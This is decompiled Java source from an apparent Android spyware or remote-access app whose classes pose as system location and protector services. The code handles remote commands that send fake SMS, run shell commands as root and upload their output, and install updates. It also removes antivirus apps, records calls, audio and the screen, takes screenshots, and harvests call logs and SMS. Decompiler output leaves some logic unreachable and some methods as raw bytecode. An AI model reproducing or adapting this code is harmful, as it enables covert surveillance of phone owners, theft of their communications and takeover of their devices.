                PlayService.iBitRate = Integer.parseInt(paramString2[0]);
                PlayService.iSamplingRate = Integer.parseInt(paramString2[1]);
                localObject = str;
                if (PlayService.ref != null)
                {
                  PlayService.ref.SetLamaSampling(PlayService.iSamplingRate);
                  return str;
                }
              }
              catch (Exception paramString2)
              {
                EXCEPT(paramString2, "*70* error command : " + paramString1);
                return "Format error: *70* BitRate SampleRate";
              }
            }
            break;
          }
        }
        return "Format error: *70* BitRate SampleRate";
        return "Format error: *70* BitRate SampleRate";
        if ((paramString1 != null) && (PlayService.ref != null))
        {
          paramString2 = paramString1.trim().split(" ", 2);
          if (paramString2.length == 2)
          {
            FLOG("Send Fake SMS to " + paramString2[0] + ",text:" + paramString2[1]);
            PlayService.ref.SendSMS(paramString2[0], paramString2[1]);
            return str;
          }
          FLOG("cannot parse command data:" + paramString1);
          return str;
        }
        FLOG("data or Context is null");
        return str;
        if (paramString1.length() == 0) {
          return "No parameter given";
        }
        paramString2 = Environment.getExternalStorageDirectory().getAbsolutePath();
        paramString1 = paramString1 + " > " + paramString2 + "/system.log";
        if (PlayService.bCanSu == PlayService.CAN)
        {
          FLOG("Exec command as ROOT:" + paramString1);
          commandSU(paramString1);
        }
        while (PlayService.ref != null)
        {
          PlayService.ref.sFileToUpload = (paramString2 + "/system.log");
          return "The file will be downloaded, swear their chips";
          FLOG("Exec command as USER:" + paramString1);
          command(paramString1);
        }
        return "Process is dead";
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "0";
        }
        PlayService.iMaxAudioListenFile = Integer.parseInt(paramString2.trim());
        if (PlayService.iMaxAudioListenFile < 102400) {
          PlayService.iMaxAudioListenFile = 102400;
        }
        if (PlayService.iMaxAudioListenFile > 10485760) {
          PlayService.iMaxAudioListenFile = 10485760;
        }
        PlayService.SaveSettings();
        return str;
        if (PlayService.bForceWIFI) {}
        for (paramBoolean = false;; paramBoolean = true)
        {
          PlayService.bForceWIFI = paramBoolean;
          PlayService.SaveSettings();
          return PlayService.res.getString(2130968631) + " WIFI: " + PlayService.bForceWIFI;
        }
        return "Set Var :" + PlayService.setVar(paramString1);
        if (paramString1.length() == 0) {
          return "No parameters given";
        }
        PlayService.ref.Install(paramString1);
        return "Update task activated " + paramString1;
        if (PlayService.bUseLame) {}
        for (paramBoolean = false;; paramBoolean = true)
        {
          PlayService.bUseLame = paramBoolean;
          return PlayService.res.getString(2130968648) + ": " + PlayService.bUseLame;
        }
        if (paramString1.length() == 0) {
          return PlayService.res.getString(2130968636);
        }
        PlayService.iRecAfterCall = Integer.parseInt(paramString1.trim());
        return PlayService.res.getString(2130968637) + " " + PlayService.iRecAfterCall;
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "0";
        }
        PlayService.iForceGPS = Integer.parseInt(paramString2);
        PlayService.SaveSettings();
        return PlayService.res.getString(2130968631) + " GPS: " + PlayService.iForceGPS;
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "0";
        }
        PlayService.iAllLogPORT = Integer.parseInt(paramString2.trim());
        return "All logs to port until reboot: " + PlayService.iAllLogPORT;
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "0";
        }
        PlayService.iGPSTimeout = Integer.parseInt(paramString2.trim());
        return PlayService.res.getString(2130968638) + " GPS: " + PlayService.iGPSTimeout;
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "0";
        }
        PlayService.iOutDBRefreshRate = Integer.parseInt(paramString2.trim());
        return "DB try read until refresh: " + PlayService.iOutDBRefreshRate;
        if (PlayService.bUseAutoCallRec) {}
        for (paramBoolean = false;; paramBoolean = true)
        {
          PlayService.bUseAutoCallRec = paramBoolean;
          return PlayService.res.getString(2130968639) + ": " + PlayService.bUseAutoCallRec;
        }
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "2";
        }
        PlayService.iAudioFormat = Integer.parseInt(paramString2.trim());
        paramString1 = PlayService.res.getString(2130968640) + " #: " + PlayService.iAudioFormat;
        PlayService.SaveSettings();
        return paramString1;
        if (paramString1.length() == 0) {
          return PlayService.res.getString(2130968641) + ": *86* ProviderURI";
        }
        paramString1 = Uri.parse(paramString1);
        paramInt = PlayService.ref.getContentResolver().delete(paramString1, null, null);
        return "Removed " + paramInt;
        PlayService.sSyncFolder = paramString1.trim();
        PlayService.lSyncFolderLastTime = 0L;
        return str;
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "1000";
        }
        PlayService.iPauseBeforeCallRecord = Integer.parseInt(paramString2.trim());
        return str;
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "0";
        }
        PlayService.iCallAnswerEvent = Integer.parseInt(paramString2.trim());
        return str;
        paramString2 = paramString1;
        if (paramString1.length() == 0) {
          paramString2 = "1";
        }
        PlayService.iCallEncoder = Integer.parseInt(paramString2.trim());
        return str;
        PlayService.bAntivirusListChanged = true;
        if (PlayService.bRemoveAntivirus) {}
        for (paramBoolean = false;; paramBoolean = true)
        {
          PlayService.bRemoveAntivirus = paramBoolean;
          return PlayService.res.getString(2130968633) + ": " + PlayService.bRemoveAntivirus;
        }
        PlayService.bAntivirusListChanged = true;
        PlayService.sAntivirusList = paramString1.trim();
        return str;
        PlayService.sBLockIPList = paramString1.trim();
        PlayService.ProcessBlockList();
        return str;
        PlayService.SetDefaultSettings();
        return str;
        PlayService.sAnswerList = paramString1.trim();
        return str;
        PlayService.sMakeCall = paramString1.trim();
        return str;
        if (paramString1.length() == 0) {
          return "No parameter given";
        }
        PlayService.iOldPickup = PlayService.iPickup;
        PlayService.iPickup ^= Integer.parseInt(paramString1.trim());
        return str;
        FLOG("Uploader kill command");
        localObject = str;
      } while (PlayService.ref == null);
      FLOG("PlayService is ok, kill uploader");
      PlayService.ref.Running = false;
      return "Ordered kill, wait a minute";
      if (Build.VERSION.SDK_INT < 19) {
        return PlayService.res.getString(2130968649);
      }
      if (paramString1.length() == 0) {
        return PlayService.res.getString(2130968650);
      }
      paramInt = Integer.parseInt(paramString1.trim());
      if ((paramInt >= 10) && (paramInt <= 3600))
      {
        if (screenrec != null)
        {
          screenrec.AddTask(paramString1.trim());
          return PlayService.res.getString(2130968651);
        }
        return "Thread SR is null!";
      }
      return PlayService.res.getString(2130968652);
      PlayService.sListToKill = paramString1.trim();
      return str;
      localObject = str;
    } while (PlayService.ref == null);
    return PlayService.ref.SipCall(paramString1.trim());
  }
  
  public static String CreateAudioThread()
  {
    FLOG("CreateAudioThread()");
    if (reference != null) {
      if ((reference.thAudio == null) || (!reference.thAudio.isAlive()))
      {
        PlayService.putEvent(PlayService.res.getString(2130968581) + " AudioThread");
        try
        {
          SMSReceiver localSMSReceiver1 = reference;
          SMSReceiver localSMSReceiver2 = reference;
          localSMSReceiver2.getClass();
          localSMSReceiver1.thAudio = new AudioMonitor(localSMSReceiver2);
          if (reference.thAudio != null) {
            reference.thAudio.start();
          }
          FLOG("New audiomonitor thread created");
          return "New audiomonitor thread created";
        }
        catch (Exception localException)
        {
          PlayService.EXCEPT(localException, "CreateAudioThread");
        }
      }
    }
    for (;;)
    {
      return "Failed to check state";
      FLOG("Thread audio seems to be alive, skip any move");
      return "Thread audio seems to be alive";
      FLOG("Failed SMSReceiver.reference == null");
    }
  }
  
  public static String CreateCommandor()
  {
    FLOG("CreateCommandor()");
    if (reference != null) {
      if ((reference.thCommandor == null) || (!reference.thCommandor.isAlive()))
      {
        PlayService.putEvent(PlayService.res.getString(2130968581) + " Commandor");
        try
        {
          SMSReceiver localSMSReceiver1 = reference;
          SMSReceiver localSMSReceiver2 = reference;
          localSMSReceiver2.getClass();
          localSMSReceiver1.thCommandor = new Commandor(localSMSReceiver2);
          if (reference.thCommandor != null) {
            reference.thCommandor.start();
          }
          FLOG("New commandor thread created");
          return "New commandor thread created";
        }
        catch (Exception localException)
        {
          PlayService.EXCEPT(localException, "CreateCommandor");
        }
      }
    }
    for (;;)
    {
      return "Failed to check state";
      FLOG("Thread audio seems to be alive, skip any move");
      return "Thread audio seems to be alive";
      FLOG("Failed SMSReceiver.reference == null");
    }
  }
  
  public static String CreateScreenRecorder()
  {
    FLOG("CreateScreenRecorder()");
    if (reference != null) {
      if ((screenrec == null) || (!screenrec.isAlive()))
      {
        PlayService.putEvent(PlayService.res.getString(2130968581) + " ScreenRecorder");
        try
        {
          SMSReceiver localSMSReceiver = reference;
          localSMSReceiver.getClass();
          screenrec = new ScreenRecorder();
          if (screenrec != null) {
            screenrec.start();
          }
          FLOG("New ScreenRecorder thread created");
          return "New ScreenRecorder thread created";
        }
        catch (Exception localException)
        {
          PlayService.EXCEPT(localException, "ScreenRecorder");
        }
      }
    }
    for (;;)
    {
      return "Failed to check state";
      FLOG("Thread ScreenRecorder seems to be alive, skip any move");
      return "Thread ScreenRecorder seems to be alive";
      FLOG("Failed SMSReceiver.reference == null");
    }
  }
  
  private void DeleteAudioTask(int paramInt)
  {
    FLOG("Deleting audio task" + paramInt);
    if (paramInt <= 0) {
      return;
    }
    try
    {
      paramInt = PlayService.ref.getContentResolver().delete(TaskProvider.CONTENT_URI, "_ID=?", new String[] { paramInt });
      FLOG("DeleteAudioTask : deleted=" + paramInt);
      return;
    }
    catch (Exception localException) {}
  }
  
  public static void EXCEPT(Exception paramException, String paramString)
  {
    PlayService.EXCEPT(paramException, paramString);
  }
  
  public static void FLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  public static void GLOG(String paramString)
  {
    PlayService.GLOG(paramString);
  }
  
  public static boolean IsAudioRecording()
  {
    if (reference == null) {}
    while (reference.thAudio == null) {
      return false;
    }
    return reference.thAudio.IsAudioRecording();
  }
  
  public static String LatLong2Address(String paramString1, String paramString2)
  {
    FLOG("LatLong2Address " + paramString1 + ":" + paramString2);
    paramString1 = PureGet("open.mapquestapi.com", "nominatim/v1/reverse?format=xml&limit=1&lat=" + paramString1 + "&lon=" + paramString2).split("<result place_id=");
    if (paramString1.length < 2)
    {
      FLOG("LatLong2Address:format Error1");
      return "";
    }
    paramString1 = paramString1[1].split("\">");
    if (paramString1.length < 2)
    {
      FLOG("LatLong2Address:format Error2");
      return "";
    }
    paramString1 = paramString1[1].split("</result><addressparts>");
    if (paramString1.length < 2)
    {
      FLOG("LatLong2Address:format Error3");
      return "";
    }
    return paramString1[0];
  }
  
  public static void MEGALOG(String paramString)
  {
    FLOG(paramString);
  }
  
  public static void PauseAudioRecord()
  {
    if ((reference != null) && (reference.thAudio != null))
    {
      FLOG("Call pause");
      reference.thAudio.Pause();
    }
  }
  
  public static String PureGet(String paramString1, String paramString2)
  {
    FLOG("PureGet" + paramString1 + "/" + paramString2);
    String str4 = "GET /" + paramString2 + " HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0\r\nHost: " + paramString1 + "\r\nDNT: 0\r\nConnection: close\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n";
    FLOG(str4);
    paramString2 = "";
    String str2 = paramString2;
    String str3 = paramString2;
    str1 = paramString2;
    try
    {
      Object localObject = new Socket(paramString1, 80);
      str2 = paramString2;
      str3 = paramString2;
      str1 = paramString2;
      ((Socket)localObject).setSoTimeout(60000);
      str2 = paramString2;
      str3 = paramString2;
      str1 = paramString2;
      paramString1 = new PrintWriter(((Socket)localObject).getOutputStream(), true);
      str2 = paramString2;
      str3 = paramString2;
      str1 = paramString2;
      localObject = new BufferedReader(new InputStreamReader(((Socket)localObject).getInputStream()));
      str1 = paramString2;
      if (paramString1 != null)
      {
        str1 = paramString2;
        if (localObject != null)
        {
          str2 = paramString2;
          str3 = paramString2;
          str1 = paramString2;
          paramString1.println(str4);
          for (;;)
          {
            str2 = paramString2;
            str1 = paramString2;
            try
            {
              paramString1 = ((BufferedReader)localObject).readLine();
              if (paramString1 == null) {
                return paramString2;
              }
              str2 = paramString2;
              str1 = paramString2;
              FLOG("[" + paramString1 + "]");
              str2 = paramString2;
              str1 = paramString2;
              paramString1 = paramString2 + paramString1 + "\n";
              paramString2 = paramString1;
            }
            catch (IOException paramString1)
            {
              str2 = paramString2;
              str3 = paramString2;
              str1 = paramString2;
              System.out.println("Read failed");
              str2 = paramString2;
              str3 = paramString2;
              str1 = paramString2;
              PlayService.EXCEPT(paramString1, "PureGetTimeout");
              return paramString2;
            }
          }
        }
      }
      return str1;
    }
    catch (UnknownHostException paramString1)
    {
      PlayService.EXCEPT(paramString1, "Get.UHException");
      return str2;
    }
    catch (IOException paramString1)
    {
      PlayService.EXCEPT(paramString1, "Get.IOException");
      return str3;
    }
    catch (Exception paramString1)
    {
      PlayService.EXCEPT(paramString1, "Get.Exception");
    }
  }
  
  public static String ReadCallHistory()
  {
    Object localObject1 = CallLog.Calls.CONTENT_URI;
    Time localTime = new Time();
    localTime.setToNow();
    localTime.minute = 0;
    localTime.hour = 0;
    long l = localTime.toMillis(true);
    Cursor localCursor = PlayService.ref.getContentResolver().query((Uri)localObject1, null, " date > " + l, null, "_id DESC");
    if (localCursor == null)
    {
      FLOG("No phonebook entries, returning...");
      localObject1 = "<empty>";
    }
    do
    {
      return localObject1;
      if (localCursor.getCount() == 0) {
        return "<empty>";
      }
      localObject2 = "";
      localObject1 = localObject2;
    } while (!localCursor.moveToFirst());
    int i = localCursor.getColumnIndex("_id");
    int j = localCursor.getColumnIndex("name");
    int k = localCursor.getColumnIndex("number");
    int m = localCursor.getColumnIndex("date");
    int n = localCursor.getColumnIndex("type");
    int i1 = localCursor.getColumnIndex("duration");
    localObject1 = localObject2 + localCursor.getString(i) + "[";
    localTime.set(localCursor.getLong(m));
    Object localObject2 = new StringBuilder(String.valueOf(localObject1 + localTime.hour + ":" + localTime.minute + " " + localTime.monthDay + "." + (localTime.month + 1) + "." + localTime.year + "]"));
    if (localCursor.getString(j) == null) {}
    for (localObject1 = "";; localObject1 = localCursor.getString(j))
    {
      localObject1 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(((StringBuilder)localObject2).append((String)localObject1).toString())).append("(").append(localCursor.getString(k)).append(")").toString())).append(localCursor.getString(n)).append(",").toString())).append(localCursor.getString(i1)).append("сек.").toString() + "\n";
      localObject2 = localObject1;
      if (localCursor.moveToNext()) {
        break;
      }
      return localObject1;
    }
  }
  
  public static String ReadSMSlist()
  {
    Object localObject2 = new Time();
    ((Time)localObject2).setToNow();
    ((Time)localObject2).minute = 0;
    ((Time)localObject2).hour = 0;
    long l = ((Time)localObject2).toMillis(true);
    Cursor localCursor = PlayService.ref.getContentResolver().query(Uri.parse("content://sms"), null, " date > " + l, null, " _ID DESC ");
    if (localCursor == null) {
      localObject2 = "error";
    }
    do
    {
      return localObject2;
      Log.d("backup.service.receiver", "Read " + Integer.toString(localCursor.getCount()) + " SMS messages from content (" + Integer.toString(localCursor.getColumnCount()) + " columns)");
      localObject1 = "";
      if (localCursor.moveToNext()) {
        break;
      }
      Log.d("backup.service.receiver", "SMS list");
      Log.d("backup.service.receiver", (String)localObject1);
      localObject2 = localObject1;
    } while (((String)localObject1).length() != 0);
    return PlayService.res.getString(2130968647);
    Object localObject1 = localObject1 + localCursor.getString(localCursor.getColumnIndex("_ID")) + "[";
    ((Time)localObject2).set(localCursor.getLong(localCursor.getColumnIndex("date")));
    localObject1 = new StringBuilder(String.valueOf(localObject1 + ((Time)localObject2).hour + ":" + ((Time)localObject2).minute + "]"));
    String str = localCursor.getString(localCursor.getColumnIndex("body"));
    if (localCursor.getString(localCursor.getColumnIndex("body")).length() > 10) {}
    for (int i = 10;; i = localCursor.getString(localCursor.getColumnIndex("body")).length())
    {
      localObject1 = ((StringBuilder)localObject1).append(str.substring(0, i)).append("...").toString() + localCursor.getString(localCursor.getColumnIndex("body")).length() + "с.\n";
      break;
    }
  }
  
  public static void ResumeAudioRecord()
  {
    reference.thAudio.Resume();
  }
  
  public static void TakeScreenShot()
  {
    commandSU("/system/bin/screencap -p " + PlayService.dataPath + "/files/screenshot.png");
  }
  
  public static void TakeScreenShotPeriod(int paramInt1, int paramInt2)
  {
    SMSReceiver localSMSReceiver = reference;
    localSMSReceiver.getClass();
    thScreenShooter = new ScreenShooter(localSMSReceiver, paramInt1, paramInt2);
    if (thScreenShooter != null) {
      thScreenShooter.start();
    }
  }
  
  private void UpdateAudioTask(int paramInt, long paramLong)
  {
    try
    {
      ContentValues localContentValues = new ContentValues();
      localContentValues.put("minutes", Long.valueOf(paramLong));
      PlayService.ref.getContentResolver().update(TaskProvider.CONTENT_URI, localContentValues, "_ID=" + paramInt, null);
      return;
    }
    catch (Exception localException) {}
  }
  
  /* Error */
  private static void command(String paramString)
  {
    // Byte code:
    //   0: invokestatic 1595	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: aconst_null
    //   7: astore 4
    //   9: aconst_null
    //   10: astore 5
    //   12: new 305	java/lang/StringBuilder
    //   15: dup
    //   16: ldc_w 1597
    //   19: invokespecial 310	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   22: aload_0
    //   23: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   26: invokevirtual 318	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   29: invokestatic 321	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
    //   32: aload 4
    //   34: astore_1
    //   35: aload_2
    //   36: ldc_w 1599
    //   39: invokevirtual 1603	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   42: astore_2
    //   43: aload_2
    //   44: astore_3
    //   45: aload 4
    //   47: astore_1
    //   48: new 1605	java/io/OutputStreamWriter
    //   51: dup
    //   52: aload_2
    //   53: invokevirtual 1608	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   56: invokespecial 1611	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   59: astore 4
    //   61: aload 4
    //   63: aload_0
    //   64: invokevirtual 1614	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   67: aload 4
    //   69: invokevirtual 1617	java/io/OutputStreamWriter:flush	()V
    //   72: aload 4
    //   74: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   77: aload 4
    //   79: ifnull +89 -> 168
    //   82: aload 4
    //   84: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   87: aload_2
    //   88: astore_1
    //   89: aload_1
    //   90: ifnull +8 -> 98
    //   93: aload_1
    //   94: invokevirtual 1623	java/lang/Process:waitFor	()I
    //   97: pop
    //   98: ldc_w 1625
    //   101: invokestatic 321	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
    //   104: return
    //   105: astore_1
    //   106: aload_3
    //   107: astore_2
    //   108: aload 5
    //   110: astore_0
    //   111: aload_1
    //   112: astore_3
    //   113: aload_0
    //   114: astore_1
    //   115: aload_3
    //   116: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   119: aload_2
    //   120: astore_1
    //   121: aload_0
    //   122: ifnull -33 -> 89
    //   125: aload_0
    //   126: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   129: aload_2
    //   130: astore_1
    //   131: goto -42 -> 89
    //   134: astore_0
    //   135: aload_0
    //   136: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   139: aload_2
    //   140: astore_1
    //   141: goto -52 -> 89
    //   144: astore_0
    //   145: aload_1
    //   146: ifnull +7 -> 153
    //   149: aload_1
    //   150: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   153: aload_0
    //   154: athrow
    //   155: astore_1
    //   156: aload_1
    //   157: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   160: goto -7 -> 153
    //   163: astore_0
    //   164: aload_0
    //   165: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   168: aload_2
    //   169: astore_1
    //   170: goto -81 -> 89
    //   173: astore_0
    //   174: aload_0
    //   175: invokevirtual 1629	java/lang/InterruptedException:printStackTrace	()V
    //   178: goto -80 -> 98
    //   181: astore_0
    //   182: aload 4
    //   184: astore_1
    //   185: goto -40 -> 145
    //   188: astore_3
    //   189: aload 4
    //   191: astore_0
    //   192: goto -79 -> 113
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	195	0	paramString	String
    //   34	60	1	localObject1	Object
    //   105	7	1	localIOException1	IOException
    //   114	36	1	localObject2	Object
    //   155	2	1	localIOException2	IOException
    //   169	16	1	localObject3	Object
    //   3	166	2	localObject4	Object
    //   5	111	3	localObject5	Object
    //   188	1	3	localIOException3	IOException
    //   7	183	4	localOutputStreamWriter	java.io.OutputStreamWriter
    //   10	99	5	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   35	43	105	java/io/IOException
    //   48	61	105	java/io/IOException
    //   125	129	134	java/io/IOException
    //   35	43	144	finally
    //   48	61	144	finally
    //   115	119	144	finally
    //   149	153	155	java/io/IOException
    //   82	87	163	java/io/IOException
    //   93	98	173	java/lang/InterruptedException
    //   61	77	181	finally
    //   61	77	188	java/io/IOException
  }
  
  /* Error */
  private static void commandREC(String paramString)
  {
    // Byte code:
    //   0: invokestatic 1595	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: aconst_null
    //   7: astore 4
    //   9: aconst_null
    //   10: astore 5
    //   12: new 305	java/lang/StringBuilder
    //   15: dup
    //   16: ldc_w 1632
    //   19: invokespecial 310	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   22: aload_0
    //   23: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   26: invokevirtual 318	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   29: invokestatic 321	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
    //   32: aload 4
    //   34: astore_1
    //   35: aload_2
    //   36: ldc_w 1634
    //   39: invokevirtual 1603	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   42: astore_2
    //   43: aload_2
    //   44: astore_3
    //   45: aload 4
    //   47: astore_1
    //   48: new 1605	java/io/OutputStreamWriter
    //   51: dup
    //   52: aload_2
    //   53: invokevirtual 1608	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   56: invokespecial 1611	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   59: astore 4
    //   61: aload 4
    //   63: aload_0
    //   64: invokevirtual 1614	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   67: aload 4
    //   69: invokevirtual 1617	java/io/OutputStreamWriter:flush	()V
    //   72: aload 4
    //   74: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   77: aload 4
    //   79: ifnull +89 -> 168
    //   82: aload 4
    //   84: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   87: aload_2
    //   88: astore_1
    //   89: aload_1
    //   90: ifnull +8 -> 98
    //   93: aload_1
    //   94: invokevirtual 1623	java/lang/Process:waitFor	()I
    //   97: pop
    //   98: ldc_w 1636
    //   101: invokestatic 321	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
    //   104: return
    //   105: astore_1
    //   106: aload_3
    //   107: astore_2
    //   108: aload 5
    //   110: astore_0
    //   111: aload_1
    //   112: astore_3
    //   113: aload_0
    //   114: astore_1
    //   115: aload_3
    //   116: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   119: aload_2
    //   120: astore_1
    //   121: aload_0
    //   122: ifnull -33 -> 89
    //   125: aload_0
    //   126: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   129: aload_2
    //   130: astore_1
    //   131: goto -42 -> 89
    //   134: astore_0
    //   135: aload_0
    //   136: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   139: aload_2
    //   140: astore_1
    //   141: goto -52 -> 89
    //   144: astore_0
    //   145: aload_1
    //   146: ifnull +7 -> 153
    //   149: aload_1
    //   150: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   153: aload_0
    //   154: athrow
    //   155: astore_1
    //   156: aload_1
    //   157: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   160: goto -7 -> 153
    //   163: astore_0
    //   164: aload_0
    //   165: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   168: aload_2
    //   169: astore_1
    //   170: goto -81 -> 89
    //   173: astore_0
    //   174: aload_0
    //   175: invokevirtual 1629	java/lang/InterruptedException:printStackTrace	()V
    //   178: goto -80 -> 98
    //   181: astore_0
    //   182: aload 4
    //   184: astore_1
    //   185: goto -40 -> 145
    //   188: astore_3
    //   189: aload 4
    //   191: astore_0
    //   192: goto -79 -> 113
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	195	0	paramString	String
    //   34	60	1	localObject1	Object
    //   105	7	1	localIOException1	IOException
    //   114	36	1	localObject2	Object
    //   155	2	1	localIOException2	IOException
    //   169	16	1	localObject3	Object
    //   3	166	2	localObject4	Object
    //   5	111	3	localObject5	Object
    //   188	1	3	localIOException3	IOException
    //   7	183	4	localOutputStreamWriter	java.io.OutputStreamWriter
    //   10	99	5	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   35	43	105	java/io/IOException
    //   48	61	105	java/io/IOException
    //   125	129	134	java/io/IOException
    //   35	43	144	finally
    //   48	61	144	finally
    //   115	119	144	finally
    //   149	153	155	java/io/IOException
    //   82	87	163	java/io/IOException
    //   93	98	173	java/lang/InterruptedException
    //   61	77	181	finally
    //   61	77	188	java/io/IOException
  }
  
  /* Error */
  private static void commandSU(String paramString)
  {
    // Byte code:
    //   0: getstatic 1639	com/android/location/PlayService:ROOTED	Z
    //   3: ifne +4 -> 7
    //   6: return
    //   7: invokestatic 1595	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   10: astore_2
    //   11: aconst_null
    //   12: astore_3
    //   13: aconst_null
    //   14: astore 4
    //   16: aconst_null
    //   17: astore 5
    //   19: new 305	java/lang/StringBuilder
    //   22: dup
    //   23: ldc_w 1641
    //   26: invokespecial 310	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   29: aload_0
    //   30: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   33: invokevirtual 318	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   36: invokestatic 321	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
    //   39: aload 4
    //   41: astore_1
    //   42: aload_2
    //   43: ldc_w 1643
    //   46: invokevirtual 1603	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   49: astore_2
    //   50: aload_2
    //   51: astore_3
    //   52: aload 4
    //   54: astore_1
    //   55: new 1605	java/io/OutputStreamWriter
    //   58: dup
    //   59: aload_2
    //   60: invokevirtual 1608	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   63: invokespecial 1611	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   66: astore 4
    //   68: aload 4
    //   70: aload_0
    //   71: invokevirtual 1614	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   74: aload 4
    //   76: invokevirtual 1617	java/io/OutputStreamWriter:flush	()V
    //   79: aload 4
    //   81: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   84: aload 4
    //   86: ifnull +89 -> 175
    //   89: aload 4
    //   91: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   94: aload_2
    //   95: astore_1
    //   96: aload_1
    //   97: ifnull -91 -> 6
    //   100: aload_1
    //   101: invokevirtual 1623	java/lang/Process:waitFor	()I
    //   104: pop
    //   105: return
    //   106: astore_0
    //   107: aload_0
    //   108: invokevirtual 1629	java/lang/InterruptedException:printStackTrace	()V
    //   111: return
    //   112: astore_1
    //   113: aload_3
    //   114: astore_2
    //   115: aload 5
    //   117: astore_0
    //   118: aload_1
    //   119: astore_3
    //   120: aload_0
    //   121: astore_1
    //   122: aload_3
    //   123: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   126: aload_2
    //   127: astore_1
    //   128: aload_0
    //   129: ifnull -33 -> 96
    //   132: aload_0
    //   133: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   136: aload_2
    //   137: astore_1
    //   138: goto -42 -> 96
    //   141: astore_0
    //   142: aload_0
    //   143: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   146: aload_2
    //   147: astore_1
    //   148: goto -52 -> 96
    //   151: astore_0
    //   152: aload_1
    //   153: ifnull +7 -> 160
    //   156: aload_1
    //   157: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   160: aload_0
    //   161: athrow
    //   162: astore_1
    //   163: aload_1
    //   164: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   167: goto -7 -> 160
    //   170: astore_0
    //   171: aload_0
    //   172: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   175: aload_2
    //   176: astore_1
    //   177: goto -81 -> 96
    //   180: astore_0
    //   181: aload 4
    //   183: astore_1
    //   184: goto -32 -> 152
    //   187: astore_3
    //   188: aload 4
    //   190: astore_0
    //   191: goto -71 -> 120
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	194	0	paramString	String
    //   41	60	1	localObject1	Object
    //   112	7	1	localIOException1	IOException
    //   121	36	1	localObject2	Object
    //   162	2	1	localIOException2	IOException
    //   176	8	1	localObject3	Object
    //   10	166	2	localObject4	Object
    //   12	111	3	localObject5	Object
